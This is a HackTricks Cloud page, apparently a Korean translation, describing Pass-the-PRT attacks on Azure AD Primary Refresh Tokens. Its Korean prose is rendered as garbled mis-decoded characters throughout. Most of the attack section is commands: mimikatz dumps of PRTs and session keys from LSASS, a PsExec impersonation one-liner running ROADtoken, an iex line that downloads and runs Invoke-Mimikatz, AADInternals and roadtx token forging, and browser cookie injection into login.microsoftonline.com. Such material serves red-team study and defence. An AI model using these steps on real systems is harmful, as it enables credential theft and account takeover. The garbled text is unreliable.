# Az - PRT ì „ë‹¬

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ë¥¼ í†µí•´ ì œë¡œë¶€í„° ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”</strong></a><strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜** **PDF í˜•ì‹ì˜ HackTricksë¥¼ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¶ë‹¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

## PRTì´ë€

{% content-ref url="az-primary-refresh-token-prt.md" %}
[az-primary-refresh-token-prt.md](az-primary-refresh-token-prt.md)
{% endcontent-ref %}

### PRTê°€ ìˆëŠ”ì§€ í™•ì¸í•˜ê¸°
```
Dsregcmd.exe /status
```
SSO ìƒíƒœ ì„¹ì…˜ì—ì„œ **`AzureAdPrt`**ê°€ **YES**ë¡œ ì„¤ì •ëœ ê²ƒì„ í™•ì¸í•´ì•¼í•©ë‹ˆë‹¤.

<figure><img src="../../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

ë™ì¼í•œ ì¶œë ¥ì—ì„œ **Azureì— ê°€ì…ëœ ì¥ì¹˜**ì¸ì§€ë„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (`AzureAdJoined` í•„ë“œì—ì„œ):

<figure><img src="../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

## PRT ì¿ í‚¤

PRT ì¿ í‚¤ëŠ” ì‹¤ì œë¡œ **`x-ms-RefreshTokenCredential`**ì´ë¼ê³  ë¶ˆë¦¬ë©° JSON Web Token (JWT)ì…ë‹ˆë‹¤. JWTì—ëŠ” **í—¤ë”**, **í˜ì´ë¡œë“œ** ë° **ì„œëª…**ìœ¼ë¡œ êµ¬ì„±ëœ 3 ë¶€ë¶„ì´ ìˆìœ¼ë©° `.`ë¡œ êµ¬ë¶„ë˜ë©° ëª¨ë‘ URL ì•ˆì „í•œ base64ë¡œ ì¸ì½”ë”©ë©ë‹ˆë‹¤. ì „í˜•ì ì¸ PRT ì¿ í‚¤ì—ëŠ” ë‹¤ìŒê³¼ ê°™ì€ í—¤ë”ì™€ ë³¸ë¬¸ì´ í¬í•¨ë©ë‹ˆë‹¤:
```json
{
"alg": "HS256",
"ctx": "oYKjPJyCZN92Vtigt/f8YlVYCLoMu383"
}
{
"refresh_token": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAZ18nQkT-eD6Hqt7sf5QY0iWPSssZOto]<cut>VhcDew7XCHAVmCutIod8bae4YFj8o2OOEl6JX-HIC9ofOG-1IOyJegQBPce1WS-ckcO1gIOpKy-m-JY8VN8xY93kmj8GBKiT8IAA",
"is_primary": "true",
"request_nonce": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAPrlbf_TrEVJRMW2Cr7cJvYKDh2XsByis2eCF9iBHNqJJVzYR_boX8VfBpZpeIV078IE4QY0pIBtCcr90eyah5yAA"
}
```
**ê¸°ë³¸ ìƒˆë¡œ ê³ ì¹¨ í† í° (PRT)**ì€ **`refresh_token`** ë‚´ì— ìº¡ìŠí™”ë˜ì–´ ìˆìœ¼ë©°, Azure ADì˜ í‚¤ë¡œ ì•”í˜¸í™”ë˜ì–´ ìˆì–´ ë‚´ìš©ì„ ìš°ë¦¬ì—ê²ŒëŠ” ë¶ˆíˆ¬ëª…í•˜ê³  í•´ë…í•  ìˆ˜ ì—†ê²Œ ë§Œë“­ë‹ˆë‹¤. **`is_primary`** í•„ë“œëŠ” ì´ í† í° ë‚´ì— ê¸°ë³¸ ìƒˆë¡œ ê³ ì¹¨ í† í°ì´ ìº¡ìŠí™”ë˜ì—ˆìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ì¿ í‚¤ê°€ ì˜ë„ëœ íŠ¹ì • ë¡œê·¸ì¸ ì„¸ì…˜ì— ìœ ì§€ë˜ë„ë¡ ë³´ì¥í•˜ê¸° ìœ„í•´ `request_nonce`ê°€ `logon.microsoftonline.com` í˜ì´ì§€ì—ì„œ ì „ì†¡ë©ë‹ˆë‹¤.

### TPMì„ ì‚¬ìš©í•œ PRT ì¿ í‚¤ íë¦„

**LSASS** í”„ë¡œì„¸ìŠ¤ëŠ” **KDF ì»¨í…ìŠ¤íŠ¸**ë¥¼ TPMì— ë³´ë‚´ê³ , TPMì€ **ì„¸ì…˜ í‚¤** (ì¥ì¹˜ê°€ AzureADì— ë“±ë¡ë  ë•Œ ìˆ˜ì§‘ë˜ê³  TPMì— ì €ì¥ëœ)ì™€ ì´ì „ ì»¨í…ìŠ¤íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ **í‚¤ë¥¼ íŒŒìƒ**í•˜ë©°, ì´ **íŒŒìƒëœ í‚¤**ëŠ” **PRT ì¿ í‚¤ (JWT)ë¥¼ ì„œëª…í•˜ëŠ” ë° ì‚¬ìš©**ë©ë‹ˆë‹¤.

**KDF ì»¨í…ìŠ¤íŠ¸**ëŠ” AzureADì˜ nonceì™€ PRTê°€ **JWT**ë¥¼ ìƒì„±í•˜ë©° **ì»¨í…ìŠ¤íŠ¸** (ì„ì˜ì˜ ë°”ì´íŠ¸)ì™€ í˜¼í•©ë©ë‹ˆë‹¤.

ë”°ë¼ì„œ, PTRì´ TPM ë‚´ë¶€ì— ìˆê¸° ë•Œë¬¸ì— ì¶”ì¶œí•  ìˆ˜ ì—†ë”ë¼ë„, LSASSë¥¼ ë‚¨ìš©í•˜ì—¬ **ìƒˆë¡œìš´ ì»¨í…ìŠ¤íŠ¸ì—ì„œ íŒŒìƒëœ í‚¤ë¥¼ ìš”ì²­í•˜ê³  ìƒì„±ëœ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ì¿ í‚¤ì— ì„œëª…**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

## PRT ë‚¨ìš© ì‹œë‚˜ë¦¬ì˜¤

**ì¼ë°˜ ì‚¬ìš©ì**ë¡œì„œ LSASSì— SSO ë°ì´í„°ë¥¼ ìš”ì²­í•˜ì—¬ **PRT ì‚¬ìš©**ì„ ìš”ì²­í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ëŠ” **ë„¤ì´í‹°ë¸Œ ì•±**ì´ **Web Account Manager** (í† í° ë¸Œë¡œì»¤)ì—ì„œ í† í°ì„ ìš”ì²­í•˜ëŠ” ë°©ì‹ìœ¼ë¡œ ìˆ˜í–‰ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. WAMì€ ìš”ì²­ì„ **LSASS**ì— ì „ë‹¬í•˜ê³ , LSASSëŠ” ì„œëª…ëœ PRT ì–´ì„¤ì…˜ì„ ì‚¬ìš©í•˜ì—¬ í† í°ì„ ìš”ì²­í•©ë‹ˆë‹¤. ë˜ëŠ” **ë¸Œë¼ìš°ì € ê¸°ë°˜ (ì›¹) í”Œë¡œìš°**ì—ì„œë„ ìˆ˜í–‰ë  ìˆ˜ ìˆìœ¼ë©°, **PRT ì¿ í‚¤**ê°€ Azure AS ë¡œê·¸ì¸ í˜ì´ì§€ë¡œì˜ ìš”ì²­ì„ ì¸ì¦í•˜ëŠ” ë° **í—¤ë”**ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤.

**SYSTEM**ìœ¼ë¡œì„œ TPMì— ì˜í•´ ë³´í˜¸ë˜ì§€ ì•Šì€ ê²½ìš° **PRTë¥¼ ë„ë‚œë‹¹í•˜ê±°ë‚˜ LSASSì—ì„œ PRT í‚¤ì™€ ìƒí˜¸ ì‘ìš©**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## PRT ì „ë‹¬ ê³µê²© ì˜ˆì‹œ

### ê³µê²© - ROADtoken

ì´ ë°©ë²•ì— ëŒ€í•œ ìì„¸í•œ ë‚´ìš©ì€ [**ì´ ê²Œì‹œë¬¼ì„ í™•ì¸í•˜ì„¸ìš”**](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/). ROADtokenì€ ì˜¬ë°”ë¥¸ ë””ë ‰í† ë¦¬ì—ì„œ **`BrowserCore.exe`**ë¥¼ ì‹¤í–‰í•˜ê³  **PRT ì¿ í‚¤ë¥¼ ì–»ê¸°** ìœ„í•´ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ ì¿ í‚¤ëŠ” ê·¸ëŸ° ë‹¤ìŒ ROADtoolsì™€ í•¨ê»˜ ì‚¬ìš©ë˜ì–´ ì¸ì¦í•˜ê³  **ì§€ì†ì ì¸ ìƒˆë¡œ ê³ ì¹¨ í† í°ì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

ìœ íš¨í•œ PRT ì¿ í‚¤ë¥¼ ìƒì„±í•˜ë ¤ë©´ ë¨¼ì € nonceê°€ í•„ìš”í•©ë‹ˆë‹¤.\
ë‹¤ìŒì„ ì‚¬ìš©í•˜ì—¬ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI"     = $URL
"Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```
ë˜ëŠ” [**roadrecon**](https://github.com/dirkjanm/ROADtools)ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
roadrecon auth prt-init
```
ê·¸ëŸ¼ [**roadtoken**](https://github.com/dirkjanm/ROADtoken)ì„ ì‚¬ìš©í•˜ì—¬ ìƒˆ PRTë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì‚¬ìš©ì í”„ë¡œì„¸ìŠ¤ì—ì„œ ë„êµ¬ ì‹¤í–‰í•˜ì—¬ ê³µê²©).
```powershell
.\ROADtoken.exe <nonce>
```
í•œ ì¤„ë¡œ:

{% code overflow="wrap" %}
```powershell
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
{% endcode %}

ê·¸ëŸ° ë‹¤ìŒ **ìƒì„±ëœ ì¿ í‚¤**ë¥¼ ì‚¬ìš©í•˜ì—¬ Azure AD **Graph** ë˜ëŠ” Microsoft Graphë¥¼ ì‚¬ìš©í•˜ì—¬ **ë¡œê·¸ì¸**í•˜ëŠ” ë° **í† í°ì„ ìƒì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
# Generate
roadrecon auth --prt-cookie <prt_cookie>

# Connect
Connect-AzureAD --AadAccessToken <token> --AccountId <acc_ind>
```
### ê³µê²© - roadrecon ì‚¬ìš©

### ê³µê²© - AADInternals ë° ìœ ì¶œëœ PTR ì‚¬ìš©

`Get-AADIntUserPRTToken`ì€ Azure ADì— ê°€ì…ë˜ê±°ë‚˜ í•˜ì´ë¸Œë¦¬ë“œë¡œ ê°€ì…ëœ ì»´í“¨í„°ì—ì„œ ì‚¬ìš©ìì˜ PRT í† í°ì„ ê°€ì ¸ì˜µë‹ˆë‹¤. `BrowserCore.exe`ë¥¼ ì‚¬ìš©í•˜ì—¬ PRT í† í°ì„ ê°€ì ¸ì˜µë‹ˆë‹¤.
```powershell
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```
ë˜ëŠ” Mimikatzì—ì„œ ê°’ì„ ê°€ì§€ê³  ìˆë‹¤ë©´ AADInternalsë¥¼ ì‚¬ìš©í•˜ì—¬ í† í°ì„ ìƒì„±í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```powershell
# Mimikat "PRT" value
$MimikatzPRT="MC5BWU..."

# Add padding
while($MimikatzPrt.Length % 4) {$MimikatzPrt += "="}

# Decode
$PRT=[text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Mimikatz "Clear key" value
$MimikatzClearKey="37c5ecdfeab49139288d8e7b0732a5c43fac53d3d36ca5629babf4ba5f1562f0"

# Convert to Byte array and B64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzClearKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate PRTToken with Nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
$prtToken
## You can already use this token ac cookie in the browser

# Get access token from prtToken
$AT = Get-AADIntAccessTokenForAzureCoreManagement -PRTToken $prtToken

# Verify access and connect with Az. You can see account id in mimikatz prt output
Connect-AzAccount -AccessToken $AT -TenantID <tenant-id> -AccountId <acc-id>
```
[https://login.microsoftonline.com](https://login.microsoftonline.com)ë¡œ ì´ë™í•˜ê³ , login.microsoftonline.comì˜ ëª¨ë“  ì¿ í‚¤ë¥¼ ì§€ìš°ê³  ìƒˆ ì¿ í‚¤ë¥¼ ì…ë ¥í•˜ì„¸ìš”.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
ê·¸ëŸ¼ [https://portal.azure.com](https://portal.azure.com)ë¡œ ì´ë™í•˜ì‹­ì‹œì˜¤.

{% hint style="danger" %}
ë‚˜ë¨¸ì§€ëŠ” ê¸°ë³¸ ì„¤ì •ìœ¼ë¡œ ì§„í–‰ë˜ì–´ì•¼ í•©ë‹ˆë‹¤. í˜ì´ì§€ë¥¼ ìƒˆë¡œê³ ì¹¨í•´ë„ ì¿ í‚¤ê°€ ì‚¬ë¼ì§€ì§€ ì•ŠëŠ”ì§€ í™•ì¸í•˜ì‹­ì‹œì˜¤. ì‚¬ë¼ì§„ë‹¤ë©´ ì‹¤ìˆ˜í•œ ê²ƒì´ë¯€ë¡œ í”„ë¡œì„¸ìŠ¤ë¥¼ ë‹¤ì‹œ ì§„í–‰í•´ì•¼ í•©ë‹ˆë‹¤. ì‚¬ë¼ì§€ì§€ ì•ŠëŠ”ë‹¤ë©´ ì¤€ë¹„ê°€ ëœ ê²ƒì…ë‹ˆë‹¤.
{% endhint %}

### ê³µê²© - Mimikatz

#### ë‹¨ê³„

1. **PRT (Primary Refresh Token)ëŠ” LSASS (Local Security Authority Subsystem Service)ì—ì„œ ì¶”ì¶œë˜ì–´ ì €ì¥**ë˜ë©° ì´í›„ ì‚¬ìš©ì„ ìœ„í•´ ë³´ê´€ë©ë‹ˆë‹¤.
2. **ì„¸ì…˜ í‚¤ê°€ ë‹¤ìŒì— ì¶”ì¶œ**ë©ë‹ˆë‹¤. ì´ í‚¤ëŠ” ì´ˆê¸°ì— ë°œê¸‰ë˜ê³  ë¡œì»¬ ì¥ì¹˜ì—ì„œ ë‹¤ì‹œ ì•”í˜¸í™”ë˜ë¯€ë¡œ DPAPI ë§ˆìŠ¤í„°í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ë³µí˜¸í™”í•´ì•¼ í•©ë‹ˆë‹¤. DPAPI (Data Protection API)ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒ ë¦¬ì†ŒìŠ¤ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) ë° ì ìš© ë°©ë²•ì— ëŒ€í•œ ì´í•´ë¥¼ ìœ„í•´ [ì¿ í‚¤ ì „ë‹¬ ê³µê²©](az-pass-the-cookie.md)ì„ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤.
3. ì„¸ì…˜ í‚¤ë¥¼ ë³µí˜¸í™”í•œ í›„ **PRTì— ëŒ€í•œ íŒŒìƒ í‚¤ ë° ì»¨í…ìŠ¤íŠ¸ë¥¼ ì–»ìŠµë‹ˆë‹¤**. ì´ë“¤ì€ **PRT ì¿ í‚¤ë¥¼ ìƒì„±í•˜ëŠ” ë° ì¤‘ìš”**í•©ë‹ˆë‹¤. íŠ¹íˆ, íŒŒìƒ í‚¤ëŠ” ì¿ í‚¤ë¥¼ êµ¬ì„±í•˜ëŠ” JWT (JSON Web Token)ì— ì„œëª…í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ í”„ë¡œì„¸ìŠ¤ì— ëŒ€í•œ í¬ê´„ì ì¸ ì„¤ëª…ì€ Dirk-janì— ì˜í•´ ì œê³µë˜ì—ˆìœ¼ë©° [ì—¬ê¸°](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="danger" %}
PRTê°€ TPM ë‚´ë¶€ì— ìˆê³  `lsass` ë‚´ë¶€ì— ì—†ëŠ” ê²½ìš° **mimikatzëŠ” ì¶”ì¶œí•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤**.\
ê·¸ëŸ¬ë‚˜ TPMì—ì„œ íŒŒìƒ í‚¤ì˜ í‚¤ë¥¼ ê°€ì ¸ì™€ì„œ ì¿ í‚¤ì— ì„œëª…í•˜ëŠ” ê²ƒì€ ê°€ëŠ¥í•  ê²ƒì…ë‹ˆë‹¤ (ì˜µì…˜ 3 í™•ì¸).
{% endhint %}

ì´ëŸ¬í•œ ì„¸ë¶€ ì •ë³´ë¥¼ ì¶”ì¶œí•˜ëŠ” ìˆ˜í–‰ëœ í”„ë¡œì„¸ìŠ¤ì— ëŒ€í•œ **ì‹¬ì¸µì ì¸ ì„¤ëª…**ì€ ì—¬ê¸°ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤: [**https://dirkjanm.io/digging-further-into-the-primary-refresh-token/**](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)

{% hint style="warning" %}
2021ë…„ 8ì›” ì´í›„ ìˆ˜ì • ì‚¬í•­ìœ¼ë¡œ ë‹¤ë¥¸ ì‚¬ìš©ìì˜ PRT í† í°ì„ ê°€ì ¸ì˜¤ëŠ” ê²ƒì€ ì •í™•íˆ ì‘ë™í•˜ì§€ ì•Šì„ ê²ƒì…ë‹ˆë‹¤ (ë¡œì»¬ ê´€ë¦¬ìëŠ” ë‹¤ë¥¸ ì‚¬ìš©ìì˜ PRTì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ì—†ì§€ë§Œ ìì‹ ì˜ ê²ƒì—ëŠ” ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŒ).
{% endhint %}

**mimikatz**ë¥¼ ì‚¬ìš©í•˜ì—¬ PRTë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap

# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```
<figure><img src="../../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>

**Prt** ë¶€ë¶„ì„ **ë³µì‚¬**í•˜ê³  ì €ì¥í•˜ì„¸ìš”.\
ì•„ë˜ í•˜ì´ë¼ì´íŠ¸ëœ **`ProofOfPossesionKey`** í•„ë“œì˜ **`KeyValue`**ì¸ ì„¸ì…˜ í‚¤ë„ ì¶”ì¶œí•˜ì„¸ìš”. ì´ ê°’ì€ ì•”í˜¸í™”ë˜ì–´ ìˆìœ¼ë©°, ì´ë¥¼ ë³µí˜¸í™”í•˜ê¸° ìœ„í•´ DPAPI ë§ˆìŠ¤í„°í‚¤ë¥¼ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤.

<figure><img src="../../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
PRT ë°ì´í„°ê°€ ë³´ì´ì§€ ì•ŠëŠ”ë‹¤ë©´, ë””ë°”ì´ìŠ¤ê°€ Azure ADì— ê°€ì…ë˜ì–´ ìˆì§€ ì•Šê±°ë‚˜ Windows 10ì˜ **ì´ì „ ë²„ì „**ì„ ì‹¤í–‰ ì¤‘ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

ì„¸ì…˜ í‚¤ë¥¼ **ë³µí˜¸í™”**í•˜ë ¤ë©´ **ê¶Œí•œì„ ìƒìŠ¹**ì‹œì¼œ **ì‹œìŠ¤í…œ** ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰í•˜ì—¬ **DPAPI ë§ˆìŠ¤í„°í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ë³µí˜¸í™”**í•´ì•¼ í•©ë‹ˆë‹¤. ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
token::elevate
dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```
<figure><img src="../../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

#### ì˜µì…˜ 1 - ì „ì²´ Mimikatz

* ì´ì œ Context ê°’ê³¼ í•¨ê»˜ ë‹¤ìŒì„ ë³µì‚¬í•˜ë ¤ê³  í•©ë‹ˆë‹¤:

<figure><img src="../../../.gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>

* ê·¸ë¦¬ê³  íŒŒìƒëœ í‚¤ ê°’:

<figure><img src="../../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

* ë§ˆì§€ë§‰ìœ¼ë¡œ ì´ ëª¨ë“  ì •ë³´ë¥¼ ì‚¬ìš©í•˜ì—¬ **PRT ì¿ í‚¤ë¥¼ ìƒì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```
<figure><img src="../../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

* [https://login.microsoftonline.com](https://login.microsoftonline.com)ë¡œ ì´ë™í•˜ê³ , login.microsoftonline.comì˜ ëª¨ë“  ì¿ í‚¤ë¥¼ ì§€ìš°ê³  ìƒˆ ì¿ í‚¤ë¥¼ ì…ë ¥í•©ë‹ˆë‹¤.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
* ê·¸ëŸ° ë‹¤ìŒ [https://portal.azure.com](https://portal.azure.com)ìœ¼ë¡œ ì´ë™í•˜ì‹­ì‹œì˜¤.

{% hint style="danger" %}
ë‚˜ë¨¸ì§€ëŠ” ê¸°ë³¸ ì„¤ì •ì´ì–´ì•¼ í•©ë‹ˆë‹¤. í˜ì´ì§€ë¥¼ ìƒˆë¡œ ê³ ì¹¨í•  ìˆ˜ ìˆê³  ì¿ í‚¤ê°€ ì‚¬ë¼ì§€ì§€ ì•ŠëŠ”ì§€ í™•ì¸í•˜ì‹­ì‹œì˜¤. ì‚¬ë¼ì§„ë‹¤ë©´ ì‹¤ìˆ˜ë¥¼ í•œ ê²ƒì´ë¯€ë¡œ í”„ë¡œì„¸ìŠ¤ë¥¼ ë‹¤ì‹œ ì§„í–‰í•´ì•¼ í•©ë‹ˆë‹¤. ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ ì œëŒ€ë¡œ ëœ ê²ƒì…ë‹ˆë‹¤.
{% endhint %}

#### ì˜µì…˜ 2 - PTRì„ ì‚¬ìš©í•œ roadrecon

* ë¨¼ì € PRTì„ ê°±ì‹ í•˜ì—¬ `roadtx.prt`ì— ì €ì¥í•˜ì‹­ì‹œì˜¤:

{% code overflow="wrap" %}
```bash
roadtx prt -a renew --prt <PRT From mimikatz> --prt-sessionkey <clear key from mimikatz>
```
* ì´ì œ `roadtx browserprtauth`ë¥¼ ì‚¬ìš©í•˜ì—¬ ëŒ€í™”í˜• ë¸Œë¼ìš°ì €ì—ì„œ **í† í°ì„ ìš”ì²­**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `roadtx describe` ëª…ë ¹ì„ ì‚¬ìš©í•˜ë©´ ì•¡ì„¸ìŠ¤ í† í°ì— MFA í´ë ˆì„ì´ í¬í•¨ë˜ì–´ ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê²½ìš° ì‚¬ìš©í•œ PRTì—ë„ MFA í´ë ˆì„ì´ ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.
```bash
roadtx browserprtauth
roadtx describe < .roadtools_auth
```
<figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

#### ì˜µì…˜ 3 - íŒŒìƒ í‚¤ë¥¼ ì‚¬ìš©í•œ roadrecon

mimikatzì— ì˜í•´ ë¤í”„ëœ ì»¨í…ìŠ¤íŠ¸ì™€ íŒŒìƒ í‚¤ë¥¼ ê°€ì§€ê³  ìˆìœ¼ë©´ roadreconì„ ì‚¬ìš©í•˜ì—¬ ìƒˆë¡œìš´ ì„œëª…ëœ ì¿ í‚¤ë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
roadrecon auth --prt-cookie <cookie> --prt-context <context> --derives-key <derived key>
```
{% endcode %}

## ì°¸ê³  ìë£Œ

* [https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)
* [https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
* [https://www.youtube.com/watch?v=x609c-MUZ\_g](https://www.youtube.com/watch?v=x609c-MUZ\_g)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œë¶€í„° ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°**!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ë ¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜**íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **HackTricks** ë° **HackTricks Cloud** ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
